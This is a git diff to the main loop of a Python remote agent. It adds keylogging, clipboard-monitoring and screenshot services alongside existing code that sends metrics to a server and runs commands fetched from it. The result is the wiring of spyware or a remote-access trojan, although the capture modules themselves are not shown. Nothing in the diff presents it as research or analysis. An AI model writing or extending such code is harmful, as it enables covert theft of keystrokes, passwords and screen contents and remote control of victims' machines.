@@ -1,18 +1,40 @@
+import platform
 import time
 
+from requests.exceptions import HTTPError
 from logger import logger
 from actions.system import get_metrics
 from app.command_handlers import execute_command
 from api.client import send_metrics, fetch_commands, update_command
 from config.settings import METRICS_INTERVAL
-from requests.exceptions import HTTPError
+from services.keylogger import start_keylogger_service
+from services.clipboard import start_clipboard_service
+from services.screenshot import start_screenshot_service
 
 class Agent:
 
     def __init__(self, agent_id):
+        """
+        Initialize the agent with its unique ID.
+        """
         self.agent_id = agent_id
 
+    def services(self):
+        """
+        Start background services for keylogging, clipboard monitoring, and screenshots.
+        """
+        SYSTEM = platform.system()
+
+        if SYSTEM in ["Windows", "Darwin"]:
+            start_keylogger_service(self.agent_id)
+            start_clipboard_service(self.agent_id)
+
+        start_screenshot_service(self.agent_id)
+
     def metrics(self):
+        """
+        Collect and send heartbeat metrics to the server.
+        """
         metrics = get_metrics()
         send_metrics(self.agent_id, metrics)
         logger.info(f"Metrics: {metrics}")
@@ -43,12 +65,20 @@ class Agent:
         except Exception as e:
             logger.error(f"Error checking commands: {e}")
 
-    def run(self):
-        while True:
+    def run(self, stop_event=None):
+        """
+        Main loop to run the agent
+        """
+        while not (stop_event and stop_event.is_set()):
             try:
                 self.metrics()
+                self.services()
                 self.check_commands()
             except Exception as e:
                 logger.error(f"Main loop error: {e}")
 
-            time.sleep(METRICS_INTERVAL)
+            # Use stop_event.wait so Stop from the menu bar takes effect immediately
+            if stop_event:
+                stop_event.wait(METRICS_INTERVAL)
+            else:
+                time.sleep(METRICS_INTERVAL)
